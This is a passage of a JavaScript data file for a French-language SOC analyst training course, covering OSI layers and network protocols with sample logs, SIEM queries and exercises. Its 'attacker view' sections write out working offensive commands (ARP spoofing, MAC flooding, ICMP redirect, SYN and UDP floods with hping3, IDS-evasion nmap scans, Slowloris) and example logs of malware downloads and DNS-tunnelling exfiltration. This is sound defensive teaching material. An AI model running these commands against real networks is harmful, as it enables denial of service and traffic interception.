// ============================================================
// SOC ACADEMY — CURRICULUM DATA v2 (Enhanced — Terrain SOC)
// ============================================================

const CURRICULUM = {

  modules: [
    // ─────────────────────────────────────────────────────────
    // MODULE 1 — FONDAMENTAUX IT
    // ─────────────────────────────────────────────────────────
    {
      id: "m1",
      titre: "Fondamentaux IT",
      description: "Réseau, OS, protocoles — les bases qu'un analyste SOC utilise chaque jour pour lire des logs et comprendre ce qu'il se passe sur un système.",
      icon: "🖥",
      couleur: "#6366f1",
      mois: "Mois 1–2",
      ordre: 1,
      objectif: "Lire et interpréter des logs réseau et système. Comprendre ce qui est normal pour détecter ce qui ne l'est pas.",
      competences: [

        // ── M1C1 ──────────────────────────────────────────────
        {
          id: "m1c1",
          titre: "Modèle OSI & TCP/IP",
          description: "Comprendre les couches réseau pour situer une attaque et choisir le bon log à analyser.",
          duree: "1 semaine",
          difficulte: "débutant",
          prerequis: [],
          sous_competences: [
            "Les 7 couches OSI et leurs rôles concrets",
            "TCP/IP 4 couches vs OSI",
            "Encapsulation / décapsulation",
            "TCP vs UDP — quand et pourquoi",
            "Handshake TCP 3 voies — lire dans Wireshark",
            "Identifier la couche d'une attaque → choisir le bon outil SOC"
          ],
          cours: {
            simple: `Le modèle OSI, c'est la carte routière du réseau. Dès qu'une alerte arrive, ta première question est : **à quelle couche ça se passe ?** La réponse te dit exactement où aller chercher les preuves et quels logs ouvrir.

---

## Couche 1 — Physique

**Ce que c'est :** câbles, Wi-Fi, fibre optique, ondes radio. Le signal brut.

**Ce que tu vois en SOC :** quasiment rien — pas de log applicatif. Mais une perte de connexion soudaine d'un switch peut signaler une attaque physique (débrancher un câble pour isoler un segment, ou un rogue device branché sur un port libre).

**Ton réflexe :** si un équipement disparaît du réseau sans explication → alerter l'équipe infrastructure, pas gérable en pur log.

---

## Couche 2 — Liaison de données

**Ce que c'est :** adresses MAC, trames Ethernet, switches. C'est la couche qui gère la communication entre deux machines sur le même réseau local.

**Ce que tu vois en logs :**
- **Switch logs** : "port X a appris 500 nouvelles adresses MAC en 10 secondes" → MAC Flooding
- **ARP tables** : deux IP différentes avec la même adresse MAC → ARP Spoofing (quelqu'un se fait passer pour le routeur)

**Attaque typique :** ARP Spoofing. L'attaquant empoisonne le cache ARP pour intercepter tout le trafic entre une victime et son routeur (Man-in-the-Middle).

**Ton réflexe :** regarder les logs du switch manageable et comparer les tables ARP avant/après l'incident.

---

## Couche 3 — Réseau

**Ce que c'est :** adresses IP, routage, ICMP. C'est la couche qui permet à un paquet d'aller d'un réseau A vers un réseau B.

**Ce que tu vois en logs :**
- **Firewall** : "IP 185.220.101.42 → 10.0.0.5 port 22 BLOCKED" → tentative d'accès SSH depuis l'externe
- **Routeur / NetFlow** : flux de données — qui parle à qui, combien de temps, combien d'octets
- **IDS/IPS** : "ICMP sweep depuis 192.168.1.100 vers /24" → scan de reconnaissance

**Attaque typique :** scan de réseau (nmap), IP Spoofing, fragmentation IP pour contourner les IDS.

**Ton réflexe :** firewall logs + NetFlow pour voir les flux anormaux (volume, destination, durée).

---

## Couche 4 — Transport

**Ce que c'est :** TCP et UDP. TCP garantit la livraison (handshake), UDP est rapide mais sans garantie.

**Ce que tu vois en logs :**
- **Firewall/IDS** : masse de connexions TCP SYN sans ACK → SYN Flood (DDoS)
- **Connexions vers des ports inhabituels** : trafic vers le port 4444 → shell Metasploit potentiel
- **Scan de ports** : des dizaines de tentatives SYN vers des ports différents en quelques secondes → nmap

**TCP vs UDP — à retenir pour le SOC :**
- **TCP** : HTTP, HTTPS, SSH, SMB, RDP → si tu vois un handshake incomplet en masse, c'est suspect
- **UDP** : DNS, DHCP, NTP, streaming → le DNS UDP en gros volume peut être du DNS tunneling ou de l'exfiltration

**Ton réflexe :** IDS alerts + firewall pour les connexions sur ports sensibles (22, 445, 3389, 4444).

---

## Couche 5 — Session

**Ce que c'est :** ouverture, maintien et fermeture des sessions entre deux applications. En pratique, c'est souvent géré par les couches au-dessus.

**Ce que tu vois en logs :**
- **Windows Event Logs** : Event 4624 (logon réussi), Event 4625 (logon échoué), Event 4634 (logoff)
- Des dizaines de 4625 d'affilée sur le même compte → brute force

**Ton réflexe :** SIEM → chercher les pics de 4625 sur un compte en moins d'une minute.

---

## Couche 6 — Présentation

**Ce que c'est :** encodage, chiffrement, compression. TLS se négocie ici. C'est la couche qui transforme les données pour qu'elles soient lisibles par l'application.

**Ce que tu vois en logs :**
- **Proxy / firewall SSL inspection** : version TLS utilisée (TLS 1.0/1.1 = obsolète, suspect), cipher suites faibles
- **Certificats auto-signés** détectés par le proxy → malware qui chiffre son C2 sans passer par une CA connue
- **Erreurs de déchiffrement** en masse → peut indiquer du trafic malformé ou une tentative de bypass SSL

**Ton réflexe :** proxy logs → chercher des connexions HTTPS vers des domaines récents ou avec des certificats auto-signés.

---

## Couche 7 — Application

**Ce que c'est :** HTTP, DNS, SMTP, FTP, SSH… Le contenu que l'utilisateur voit et utilise.

**Ce que tu vois en logs :**
- **Proxy web** : "GET http://malware.xyz/payload.exe HTTP/1.1" → téléchargement suspect
- **DNS** : requêtes vers des domaines générés automatiquement (DGA) comme \`a8k2j.xyz\` → malware qui cherche son C2
- **Email gateway** : pièce jointe .xlsm avec macro depuis une adresse externe inconnue → phishing
- **Proxy** : un poste fait 5000 requêtes HTTP vers le même domaine en 10 min → beacon de malware

**Ton réflexe :** proxy + DNS logs — c'est là que la majorité des alertes SOC L1 seront traitées au quotidien.

---

## La règle d'or SOC

> **Couche identifiée = source de log à ouvrir.** Ne jamais chercher une attaque couche 7 dans les logs firewall sans avoir aussi le proxy ouvert, et vice versa.

| Couche | Logs à ouvrir |
|--------|--------------|
| 2 — Liaison | Switch logs, ARP tables |
| 3 — Réseau | Firewall, NetFlow, routeur |
| 4 — Transport | IDS/IPS, firewall (ports) |
| 5 — Session | Windows Event Logs (4624/4625) |
| 6 — Présentation | Proxy SSL, certificats |
| 7 — Application | Proxy web, DNS, email gateway, SIEM |`,

            technique: `## Handshake TCP en détail

\`\`\`
Client          Serveur
  |---SYN------->|   (seq=100)
  |<--SYN-ACK----|   (seq=200, ack=101)
  |---ACK------->|   (seq=101, ack=201)
  |  [ESTABLISHED]
\`\`\`

**Ce que ça signifie en SOC :**
- Voir SYN sans SYN-ACK → port fermé (RST) ou filtré (timeout)
- Masse de SYN sans ACK → SYN Flood (DDoS)
- SYN-ACK depuis un port inattendu → service non autorisé

## Ports importants à connaître par cœur

| Port | Protocole | Normale? |
|------|-----------|----------|
| 22   | SSH | Oui — mais surveiller l'origine |
| 23   | Telnet | NON — protocole clair, obsolète |
| 25   | SMTP | Serveur mail seulement |
| 53   | DNS | Partout, surveiller le volume |
| 80   | HTTP | Web non chiffré — suspect en 2024 |
| 443  | HTTPS | Normal |
| 445  | SMB | LAN seulement — externe = alerte |
| 3389 | RDP | LAN/VPN seulement — externe = alerte critique |
| 4444 | Metasploit default | Toujours suspect |
| 8080 | HTTP alt | Souvent C2 ou proxy |

## NetFlow — données couche 3/4

NetFlow ne capture pas le contenu, seulement les métadonnées :
\`\`\`
src_ip=192.168.1.50  dst_ip=185.220.101.42  sport=51234  dport=443
proto=TCP  bytes=2400000  packets=1800  start=09:12:03  end=09:47:21
\`\`\`
2,4 Mo en 35 min vers une IP externe inconnue → exfiltration potentielle.`,

            attaquant: `## Exploitation par couche OSI — Vision complète

> L'attaquant choisit la couche d'attaque selon sa position dans le réseau et son objectif. Chaque couche ouvre des vecteurs différents.

---

## Couche 2 — Liaison de données

### ARP Spoofing (Man-in-the-Middle)
L'attaquant empoisonne le cache ARP des victimes pour se placer entre elles et le routeur.
\`\`\`bash
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1   # Empoisonner la victime
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   # Empoisonner le routeur
echo 1 > /proc/sys/net/ipv4/ip_forward           # Activer le forwarding
\`\`\`
Résultat : tout le trafic victime ↔ routeur passe par l'attaquant. Il peut lire (sniff), modifier (tamper) ou bloquer.

### MAC Flooding
Saturer la table CAM du switch avec des milliers de fausses adresses MAC.
\`\`\`bash
macof -i eth0    # outil dsniff
\`\`\`
Résultat : le switch ne sait plus où envoyer les trames → il broadcast tout → l'attaquant reçoit tout le trafic (comportement "hub").

### VLAN Hopping (Double Tagging 802.1Q)
Envoyer une trame avec deux tags VLAN pour accéder à un VLAN normalement inaccessible.
\`\`\`
Trame native (VLAN 1) encapsulée dans VLAN 10 → le switch retire le premier tag
→ la trame arrive dans le VLAN 10 (cible), d'où la victime n'aurait pas dû être accessible
\`\`\`
Condition : fonctionne si le port de l'attaquant est en mode trunk non sécurisé.

---

## Couche 3 — Réseau

### IP Spoofing
Usurper l'adresse IP source pour :
- Contourner des ACL basées sur l'IP ("seule 10.0.0.1 peut accéder au mgmt")
- Lancer des attaques réfléchies : l'attaquant envoie des requêtes avec l'IP de la victime → le serveur répond vers la victime (amplification DDoS)

### Smurf Attack (ICMP Amplification)
\`\`\`
Attaquant → ICMP Echo Request broadcast (src=IP victime)
Toutes les machines du réseau → répondent à la victime
Résultat : la victime reçoit X fois le trafic envoyé (amplification)
\`\`\`

### ICMP Redirect
Envoyer un faux message ICMP Redirect pour modifier la table de routage d'un hôte.
\`\`\`bash
hping3 --icmp --icmp-type 5 --icmp-code 1 -a 192.168.1.1 192.168.1.100
# Force la victime à router via l'attaquant
\`\`\`

### Fragmentation Attack
Découper les paquets malveillants en fragments pour contourner les IDS/firewalls qui n'inspectent pas la réassemblée.
\`\`\`bash
nmap -f --mtu 8 192.168.1.50    # Fragmentation nmap (8 octets par fragment)
\`\`\`

---

## Couche 4 — Transport

### SYN Flood (DDoS)
\`\`\`bash
hping3 -S --flood -p 80 --rand-source target.com
# --rand-source : IPs sources aléatoires → impossible de bloquer une IP
\`\`\`
Épuise la table des connexions semi-ouvertes (backlog TCP). Le serveur ne peut plus accepter de nouvelles connexions légitimes.

### UDP Flood
\`\`\`bash
hping3 --udp -p 80 --flood target.com
\`\`\`
Sature la bande passante et force le serveur à répondre ICMP Port Unreachable pour chaque paquet.

### Session Hijacking
Si l'attaquant peut prédire ou intercepter les numéros de séquence TCP, il peut injecter des données dans une session établie ou la détourner.
Condition : trafic non chiffré (HTTP, Telnet) ou clés de session faibles.

### Port Scanning — Du plus furtif au plus agressif
\`\`\`bash
nmap -sS -T0 -p 22,80,443,3389 192.168.1.50   # Très furtif (lent)
nmap -sS -T4 -p- 192.168.1.0/24               # Rapide, détectable
masscan -p1-65535 192.168.1.0/24 --rate=10000  # Très rapide, très bruyant
nmap -sV -sC --script=vuln 192.168.1.50        # Détection vuln (très visible)

# Options d'évasion IDS
nmap -D RND:10 -f --data-length 200 192.168.1.50
# -D = decoys (leurres), -f = fragmentation, --data-length = padding
\`\`\`

**Ce que le scan révèle à l'attaquant :**
- Ports ouverts → services en écoute
- Versions des services (-sV) → CVE applicables
- OS fingerprinting (-O) → Windows/Linux, version
- Scripts NSE → vulnérabilités directement testées

---

## Couche 7 — Application

### HTTP Slowloris
Ouvrir des centaines de connexions HTTP et ne jamais les terminer, gardant le serveur occupé.
\`\`\`bash
slowloris target.com -p 80 -s 500   # 500 connexions semi-ouvertes
\`\`\`
Résultat : le serveur Apache/Nginx épuise ses threads de connexion disponibles.

### DNS Amplification (DDoS réfléchi)
\`\`\`
Attaquant → requête DNS ANY (src=IP victime) → Résolveur ouvert
Résolveur → réponse massive (50x la requête) → Victime
\`\`\`
Facteur d'amplification : jusqu'à 70x. Résolveurs DNS ouverts = amplificateurs involontaires.

---

## Mindset attaquant — Kill Chain réseau

\`\`\`
1. RECONNAISSANCE (passive)
   Shodan / Censys → ports ouverts sans scanner la cible

2. SCANNING (actif)
   nmap -sS -T2 → discret

3. ENUMERATION
   nmap -sV -sC → versions et vulnérabilités

4. ACCÈS INITIAL
   Exploiter la vuln trouvée (CVE, brute force, phishing)

5. PIVOT
   ARP spoofing ou mouvement latéral TCP

6. EXFILTRATION
   DNS tunneling, HTTPS vers C2
\`\`\`

**Règle d'or :** Plus l'attaque est basse dans le modèle OSI, plus elle est difficile à détecter par les outils applicatifs — mais plus elle nécessite un accès réseau physique ou logique.`,

            soc: `## Détecter par couche

**Couche 2 — ARP Spoofing :**
Signe : deux entrées ARP différentes pour la même IP.
\`\`\`
Log switch : IP 192.168.1.1 seen with MAC aa:bb:cc:11:22:33 (was ff:ee:dd:99:88:77)
\`\`\`
Règle SIEM : \`ARP reply with conflicting MAC for same IP within 60s\`

**Couche 4 — SYN Flood :**
\`\`\`
Firewall log : 50000 SYN/min depuis 203.0.113.42 → 10.0.0.5:80
State table usage : 98%
\`\`\`
Règle : \`SYN count > 1000/min from single source → alert HIGH\`

**Couche 4 — Scan de ports :**
\`\`\`
IDS alert: [SCAN] TCP SYN portscanning from 192.168.10.15
Connection attempts: 1024 ports in 45 seconds, 95% RST received
\`\`\`

**Couche 7 — C2 HTTP :**
Trafic régulier (beaconing) toutes les X secondes → intervalles réguliers = suspect.
\`\`\`
proxy.log: 192.168.1.80 GET http://185.220.x.x/update 200 OK - every 300s
\`\`\``,

            logs_exemples: `## Exemples de logs réels — Couche réseau

### Firewall log (format CEF / syslog)
\`\`\`
Jan 15 09:23:41 fw01 kernel: [UFW BLOCK] IN=eth0 SRC=45.33.32.156 DST=10.0.0.5
  PROTO=TCP SPT=54321 DPT=22 SYN
Jan 15 09:23:41 fw01 kernel: [UFW BLOCK] IN=eth0 SRC=45.33.32.156 DST=10.0.0.5
  PROTO=TCP SPT=54322 DPT=3389 SYN
Jan 15 09:23:41 fw01 kernel: [UFW BLOCK] IN=eth0 SRC=45.33.32.156 DST=10.0.0.5
  PROTO=TCP SPT=54323 DPT=445 SYN
\`\`\`
**Interprétation :** Scan de ports consécutifs depuis 45.33.32.156 → probe automatisé. Vérifier dans AbuseIPDB.

### Wireshark — SYN Flood
\`\`\`
Time    Source           Dest         Proto  Info
0.000   203.0.113.42    10.0.0.5     TCP    54000 → 80 [SYN] Seq=0
0.001   203.0.113.42    10.0.0.5     TCP    54001 → 80 [SYN] Seq=0
0.001   203.0.113.42    10.0.0.5     TCP    54002 → 80 [SYN] Seq=0
[1000 lignes similaires en 2 secondes]
\`\`\`
**Interprétation :** SYN Flood — aucun ACK de retour, source unique, port destination fixe.

### NetFlow — Exfiltration potentielle
\`\`\`
2024-01-15 14:32:10 | 10.10.5.23 | 185.220.101.1 | 443 | TCP | 847MB | 3600s
2024-01-15 14:32:10 | 10.10.5.23 | 8.8.8.8       | 53  | UDP | 2MB   | 3600s
\`\`\`
**Interprétation :** 847 Mo vers une IP externe en 1h + volume DNS élevé → exfil probable.`,

            atelier: {
              titre: "Atelier : Analyser un scan de ports dans Wireshark",
              duree: "45 min",
              niveau: "débutant",
              objectif: "Identifier un scan nmap dans une capture réseau et documenter les findings",
              contexte: "Tu viens de recevoir une alerte IDS : 'Port scan detected from 192.168.50.5'. Ton manager te demande de confirmer et de déterminer quels ports ont été scannés et si des services ont répondu.",
              outils: ["Wireshark", "Fichier PCAP (CyberDefenders ou Wireshark samples)"],
              etapes: [
                "Ouvrir le fichier PCAP dans Wireshark",
                "Filtre : `tcp.flags.syn==1 && tcp.flags.ack==0` → voir tous les SYN",
                "Filtre : `ip.src==192.168.50.5` → isoler la source",
                "Statistics → Conversations → TCP → trier par nombre de paquets",
                "Identifier les ports qui ont répondu SYN-ACK (service ouvert) vs RST (port fermé)",
                "Filtre : `tcp.flags.syn==1 && tcp.flags.ack==1` → ports ouverts confirmés",
                "Documenter : IP source, IP cible, ports ouverts trouvés, durée du scan"
              ],
              livrable: "Un mini-rapport de 5 lignes : qui a scanné quoi, quand, quels ports sont ouverts, recommandation.",
              questions_correction: [
                "La source est-elle interne ou externe ? (interne = compromission possible, externe = probe)",
                "Les ports ouverts correspondent-ils à des services légitimes ?",
                "Le timing du scan (T1/T2/T4/T5 nmap) est-il détectable ?"
              ]
            },

            cas_concret: `## Scénario terrain : Scan de reconnaissance détecté à 2h du matin

**2h14 — Alerte IDS :** "TCP SYN Portscan from 203.0.113.88 → 10.0.0.0/24"

**Étape 1 — Qualifier l'alerte**
- Source externe (203.0.113.88) → pas un scan interne
- Cible : toute la DMZ (10.0.0.0/24, 256 IPs)
- Heure : 2h14 → inhabituel (mais scans automatisés sont courants la nuit)

**Étape 2 — Enrichir l'IP**
- AbuseIPDB : 203.0.113.88 → score 95/100, rapporté 847 fois, catégories : scan + brute force
- Shodan : ports ouverts sur cette IP → serveur Kali Linux probable
- VirusTotal : 4/80 AV détectent cette IP comme malveillante

**Étape 3 — Analyse Firewall**
- 3 847 tentatives en 4 minutes → scan agressif (nmap -T4 ou Masscan)
- Ports ciblés : 22, 80, 443, 3389, 8080, 8443, 21, 25, 3306
- Résultat : 2 ports ont répondu (port 80 et 443 du reverse proxy)

**Étape 4 — Actions**
- Bloquer 203.0.113.88 sur le firewall périmétrique
- Vérifier les 2 services exposés (80/443) → sont-ils patchés ?
- Documenter dans TheHive : alerte, enrichissement, action, statut = CLOSED/BLOCKED
- Faux positif ? Non → vrai positif, faible sévérité (reconnaissance seulement)`,

            exercices: [
              { titre: "Mémoriser les ports critiques SOC", desc: "Flashcards : 22/23/25/53/80/443/445/3389/3306/1433/4444/8080. Pour chaque port : protocole, usage légitime, usage malveillant.", difficulte: "facile", type: "mémo" },
              { titre: "Lire un log firewall", desc: "Donné : 10 lignes de logs firewall (format syslog). Pour chaque ligne : identifier source, destination, port, action (ALLOW/BLOCK), et si c'est suspect ou normal.", difficulte: "facile", type: "analyse" },
              { titre: "Wireshark — Handshake TCP", desc: "Dans Wireshark : ouvrir un pcap HTTP. Filtrer sur `tcp.stream eq 0`. Identifier les 3 paquets du handshake. Relever les numéros de séquence.", difficulte: "moyen", type: "lab", outil: "Wireshark" },
              { titre: "Classifier 20 connexions réseau", desc: "Donnée : tableau de 20 connexions (IP src, IP dst, port, protocole). Marquer chaque connexion : NORMALE / SUSPECTE / CRITIQUE. Justifier en une phrase.", difficulte: "moyen", type: "analyse" }
            ],

            questions: [
              "À quelle couche OSI opère un IDS réseau ? Pourquoi ?",
              "Tu vois 50 000 SYN/min vers votre serveur web. Quelle est la première action ?",
              "Différence entre un port CLOSED (RST) et FILTERED (timeout) dans nmap ?",
              "Pourquoi RDP sur Internet est-il une alerte critique et non juste suspecte ?",
              "Un hôte interne contacte une IP externe sur le port 4444. Que faites-vous ?"
            ],

            niveau_recruteur: `## Ce qu'attend le recruteur (SOC L1 Junior)

**Niveau minimum attendu :**
- Savoir expliquer OSI en 1 minute en entretien (sans hésiter)
- Connaître les ports critiques par cœur (22, 53, 80, 443, 445, 3389, 3306)
- Lire un log firewall et dire si c'est suspect
- Comprendre ce qu'est un SYN Flood et comment le détecter

**Question piège fréquente en entretien :**
"Comment détecteriez-vous un scan de ports dans vos logs ?"
→ Réponse attendue : RST en masse depuis une même source, alerte IDS, corrélation avec le volume de connexions sur des ports variés.

**Ce qu'on ne vous demandera PAS en L1 :**
Configurer un routeur BGP ou expliquer OSPF en détail.`,

            erreurs: [
              "Confondre TCP/IP (4 couches) et OSI (7 couches) en entretien → dire OSI en précisant les 7.",
              "Penser que bloquer l'IP qui scanne est suffisant → noter l'incident, vérifier les services exposés.",
              "Ignorer les scans 'normaux' de l'Internet → ils le sont, mais un scan ciblé sur des ports internes est différent.",
              "Oublier de documenter : même une alerte bénigne doit être documentée dans le système de tickets."
            ],
            resume: `Couche OSI = source de log à chercher. Ports par cœur : 22/53/80/443/445/3389. SYN flood = masse de SYN sans ACK. Scan de ports = RST en masse + alerte IDS. Toujours enrichir une IP externe (AbuseIPDB + VirusTotal) avant de conclure.`
          }
        },

        // ── M1C2 ──────────────────────────────────────────────
        {
          id: "m1c2",
          titre: "Protocoles réseau — lecture SOC",
          description: "DNS, HTTP/S, SSH, SMTP, DHCP : comprendre le trafic normal pour détecter les anomalies.",
          duree: "1 semaine",
          difficulte: "débutant",
          prerequis: ["m1c1"],
          sous_competences: [
            "DNS : résolution, types d'enregistrements, DNS tunneling, DGA",
            "HTTP/HTTPS : méthodes, codes de statut, headers suspects",
            "SSH : auth par clé, brute force, port forwarding",
            "SMTP : flux email, SPF/DKIM/DMARC, spoofing",
            "DHCP : DORA, rogue DHCP, starvation",
            "Lire des logs proxy, DNS, mail gateway"
          ],
          cours: {
            simple: `Ces protocoles sont le langage du réseau. En SOC, tu les lis dans les logs toute la journée. L'objectif n'est pas de les configurer — c'est de repérer quand quelque chose cloche.

---

## DNS — Domain Name System

**Ce que c'est :** Le DNS traduit un nom de domaine (google.com) en adresse IP. Toutes les connexions Internet passent par le DNS. C'est pour ça que les attaquants l'adorent : il est rarement bloqué et peu surveillé.

**Ce que tu vois en logs :**
- **DNS query vers un domaine bizarre** : \`a3kf92.xyz\` → domaine généré aléatoirement (DGA) = malware cherchant son serveur C2
- **Gros volume de requêtes DNS** vers un seul domaine : poste qui beacon toutes les 30 secondes → malware actif
- **Réponses DNS anormalement longues** : sous-domaines longs (\`aGVsbG8gd29ybGQ=.evil.com\`) → DNS tunneling, exfiltration de données

**Attaque typique :** DNS tunneling — l'attaquant encode des données dans les requêtes DNS pour exfiltrer sans déclencher les alertes HTTP/HTTPS.

**Ton réflexe :** proxy/DNS logs → volume de requêtes par poste et par domaine. Un poste normal fait ~200 requêtes DNS/heure. 5000/heure = investigation.

---

## HTTP / HTTPS

**Ce que c'est :** HTTP transporte les pages web. HTTPS = HTTP chiffré avec TLS. En 2024, ~95% du trafic web est en HTTPS — mais ça ne veut pas dire que c'est safe.

**Ce que tu vois en logs (proxy web) :**
- \`GET http://185.220.101.42/payload.exe\` → téléchargement depuis une IP brute (pas de domaine) = très suspect
- User-Agent bizarre : \`Mozilla/4.0 (compatible; MSIE 6.0)\` → vieux navigateur ou outil automatisé
- Connexion régulière toutes les X secondes vers le même domaine → beacon de C2
- Code HTTP 200 + gros volume sortant → exfiltration via upload déguisé en navigation

**Attaque typique :** malware en beacon HTTP/HTTPS — toutes les 60 secondes, le malware fait un GET vers son C2 pour recevoir des ordres.

**Ton réflexe :** proxy logs → filtrer par fréquence de connexion, taille des réponses, User-Agent, et destinations géographiques inhabituelles.

---

## SMTP — Email

**Ce que c'est :** Protocole d'envoi d'emails. Vecteur d'attaque n°1 en entreprise (phishing, spearphishing, BEC). SPF/DKIM/DMARC = les trois garde-fous anti-spoofing.

**Ce que tu vois en logs (email gateway) :**
- Email avec **SPF FAIL + DKIM FAIL** → domaine expéditeur usurpé = phishing quasi certain
- Pièce jointe \`.xlsm\`, \`.docm\`, \`.iso\`, \`.lnk\` depuis un expéditeur inconnu → malware
- Email envoyé depuis l'externe avec l'affichage nom du PDG → BEC (Business Email Compromise)
- Spike d'envois depuis un compte interne → compte compromis qui spamme

**Attaque typique :** spearphishing — email ciblé qui imite un fournisseur ou un collègue pour obtenir un virement ou des identifiants.

**Ton réflexe :** email gateway → vérifier SPF/DKIM/DMARC en premier, puis analyser la pièce jointe dans un sandbox (Any.run, Hybrid Analysis).

---

## SSH — Secure Shell

**Ce que c'est :** SSH permet d'accéder à distance à un serveur en ligne de commande, de façon chiffrée. Port 22 par défaut. Outil légitime — et vecteur d'attaque majeur si mal configuré.

**Ce que tu vois en logs (auth.log / syslog) :**
- \`Failed password for root from 185.234.218.45\` × 500 en 2 minutes → brute force SSH
- \`Accepted password for user from\` une IP externe inconnue → connexion suspecte à investiguer
- Connexion SSH depuis un pays inhabituel pour cet utilisateur → alerte MFA ou géolocalisation

**Attaque typique :** brute force par dictionnaire sur root — l'attaquant essaie des milliers de mots de passe. Si root a un mot de passe faible et pas de fail2ban → compromission.

**Ton réflexe :** auth.log → chercher les pics de "Failed password" sur root ou des comptes de service. Corréler avec l'IP source sur AbuseIPDB.

---

## SMB — Server Message Block

**Ce que c'est :** Protocole de partage de fichiers Windows. Port 445. Utilisé partout en entreprise pour les partages réseau (\`\\\\serveur\\dossier\`).

**Ce que tu vois en logs :**
- Connexion SMB depuis l'externe (Internet → port 445) → alerte critique, vecteur EternalBlue/WannaCry
- Accès SMB d'un poste utilisateur vers de nombreux autres postes → Lateral Movement (worm ou attaquant)
- Pic de lecture SMB sur un serveur de fichiers → ransomware en train de chiffrer

**Attaque typique :** Lateral Movement via SMB — l'attaquant se déplace de machine en machine avec des credentials volés.

**Ton réflexe :** firewall → bloquer SMB vers l'externe, IDS → alertes sur les scans SMB internes.

---

## Tableau de synthèse SOC

| Protocole | Port | Log à regarder | Signal d'alarme |
|-----------|------|----------------|-----------------|
| DNS | 53/UDP | DNS logs, proxy | Volume anormal, domaines DGA |
| HTTP | 80/TCP | Proxy web | User-Agent suspect, téléchargement .exe |
| HTTPS | 443/TCP | Proxy SSL | Certificat auto-signé, beacon régulier |
| SMTP | 25/587 | Email gateway | SPF/DKIM fail, pièce jointe suspecte |
| SSH | 22/TCP | auth.log, SIEM | Brute force, connexion externe suspecte |
| SMB | 445/TCP | Firewall, EDR | Externe → interne, lateral movement |`,

            technique: `## DNS — Anatomie d'une requête

\`\`\`
Client → Requête A google.com → Resolver
Resolver → Requête → Root server → TLD .com → Authoritative
Authoritative → 142.250.75.110 → Resolver → Client
\`\`\`

**Types d'enregistrements utiles en SOC :**
- A : IPv4 d'un domaine
- AAAA : IPv6
- MX : serveur mail (vérif SPF)
- TXT : SPF, DKIM, vérifications de domaine
- CNAME : alias → chaîne de redirections (C2 multi-hop)
- NS : serveur DNS autoritaire

**HTTP — Headers critiques en investigation :**
\`\`\`
GET /update?id=abc123 HTTP/1.1
Host: cdn.legit-looking.com
User-Agent: Mozilla/5.0 (compatible; Googlebot)   ← FAUX
Accept: */*
X-Forwarded-For: 192.168.1.50                      ← IP interne exposée
\`\`\`

**SMTP — Headers d'un email spoofé :**
\`\`\`
Received: from mail.evil.ru (mail.evil.ru [185.220.x.x])
From: "DRH Entreprise" <drh@monentreprise.fr>
Return-Path: <attacker@evil.ru>          ← Différent du From !
X-Originating-IP: 185.220.x.x
Authentication-Results: spf=fail; dkim=none; dmarc=fail
\`\`\``,

            attaquant: `## Abus des protocoles

**DNS Tunneling (exfiltration/C2) :**
\`\`\`
# Data encodée dans les sous-domaines
dGhpcyBpcyBleGZpbHRyYXRlZCBkYXRh.evil.com
aGVsbG8gd29ybGQ.evil.com
\`\`\`
Outil : iodine, dnscat2. Contourne les firewalls qui autorisent le DNS sortant.

**DGA (Domain Generation Algorithm) :**
Le malware génère des domaines aléatoires : \`xk3mpl9a.xyz\`, \`q7wnbr2k.top\`…
Seul l'attaquant connaît quel domaine sera enregistré ce jour-là.

**HTTP C2 Beaconing :**
Le malware "appelle" son C2 à intervalle régulier :
\`\`\`
09:00:00 GET /check HTTP/1.1 → 185.x.x.x:443
09:05:00 GET /check HTTP/1.1 → même IP
09:10:00 GET /check HTTP/1.1 → même IP (± quelques secondes de jitter)
\`\`\`

**SMTP Spoofing :**
Sans DMARC configuré, envoyer un email depuis \`drh@victime.fr\` est trivial si l'expéditeur contrôle son serveur SMTP.`,

            soc: `## Détecter les abus protocolaires

**DNS Tunneling :**
- Volume : >500 req DNS/h depuis un seul poste → suspect
- Entropie : sous-domaines très longs (>30 car) et aléatoires
- Type TXT en masse : souvent utilisé pour l'exfiltration
\`\`\`
Splunk SPL :
index=dns | stats count by src_ip, query
| where length(query) > 40 | sort -count
\`\`\`

**Beaconing HTTP :**
\`\`\`
Splunk SPL :
index=proxy | stats count, dc(url) by src_ip, dest_ip, dest_port
| where count > 50 AND dc(url) < 3
\`\`\`
Un seul poste, une seule IP distante, très peu d'URLs différentes, > 50 connexions = beaconing.

**SSH Brute Force :**
\`\`\`
grep "Failed password" /var/log/auth.log | awk '{print $9}' | sort | uniq -c | sort -rn | head -10
\`\`\`
> 10 échecs en < 5 min depuis la même IP = brute force.

**Email spoofé :**
Vérifier systématiquement dans les headers :
1. \`Return-Path\` ≠ \`From\` → suspect
2. \`Authentication-Results: spf=fail\` → spoofing probable
3. IP d'envoi dans un ASN inhabituel pour le domaine`,

            logs_exemples: `## Exemples de logs terrain

### Proxy web (Squid / Zscaler)
\`\`\`
2024-01-15 14:23:01 192.168.1.80 TCP_MISS/200 GET https://185.220.101.42/update
  "curl/7.68.0" - DIRECT 185.220.101.42
2024-01-15 14:28:01 192.168.1.80 TCP_MISS/200 GET https://185.220.101.42/update
  "curl/7.68.0" - DIRECT 185.220.101.42
[toutes les 5 minutes, même IP, même URL, User-Agent curl]
\`\`\`
**Interprétation :** Beaconing. User-Agent curl = souvent script automatisé ou malware basique. Pas un navigateur humain.

### DNS resolver (Bind / pfSense)
\`\`\`
15-Jan-2024 09:12:33 queries: client 192.168.5.23 query: aGVsbG8.data.evil.xyz A
15-Jan-2024 09:12:34 queries: client 192.168.5.23 query: d29ybGQ.data.evil.xyz A
15-Jan-2024 09:12:35 queries: client 192.168.5.23 query: dGhpcw.data.evil.xyz TXT
[5000 requêtes en 30 min, sous-domaines aléatoires, même domaine racine]
\`\`\`
**Interprétation :** DNS Tunneling actif. Base64 dans les sous-domaines. Isoler le poste immédiatement.

### Auth.log Linux — SSH Brute Force
\`\`\`
Jan 15 03:22:14 srv01 sshd[12345]: Failed password for root from 45.33.32.156 port 52341 ssh2
Jan 15 03:22:15 srv01 sshd[12346]: Failed password for root from 45.33.32.156 port 52342 ssh2
Jan 15 03:22:16 srv01 sshd[12347]: Failed password for admin from 45.33.32.156 port 52343 ssh2
[200 tentatives en 3 minutes]
Jan 15 03:25:01 srv01 sshd[12400]: Accepted password for deploy from 45.33.32.156 port 52501 ssh2
\`\`\`
**Interprétation :** Brute force réussi sur le compte "deploy" ! Alerte CRITIQUE — compromission confirmée.`,

            atelier: {
              titre: "Atelier : Analyser un email de phishing",
              duree: "1h",
              niveau: "débutant",
